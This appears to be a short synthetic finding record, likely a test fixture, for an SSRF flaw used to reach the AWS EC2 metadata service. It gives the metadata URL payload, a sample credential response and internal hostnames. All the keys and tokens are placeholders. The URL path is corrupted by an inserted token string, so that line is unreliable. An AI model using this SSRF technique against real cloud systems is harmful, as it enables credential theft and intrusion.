raw_text:
Server-Side Request Forgery - AWS Metadata Service Exploitation

SSRF vulnerability allows attacker to retrieve AWS EC2 metadata via /fetch endpoint.
Application fetches content from attacker-controlled URL without validation.

Attack demonstrates metadata service access:
http://169.254.169.254/lask_sk_test_SYNTHETIC_ONLY_00002_SYNTHETIC_ONLY_00002/meta-data/iam/security-credentials/

Metadata retrieved:
{
  "Code" : "Success",
  "AccessKeyId" : "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token" : "AQoDYXdzEJr..exampletoken"
}

Internal systems exposed:
- RDS database: prod-mysql.internal.aws
- ElastiCache instance: redis-cache.internal
- Internal admin email: devops@acmecorp.com

Testing performed from internal IP 10.0.0.1
Service token (Lambda execution role): ya29.a0AfH6SMCz_InternalServiceToken_Example
API Key for monitoring: sk_sk_sk_test_SYNTHETIC_ONLY_00002_SYNTHETIC_ONLY_00002_51234567890abcdefghijklmnopqrst
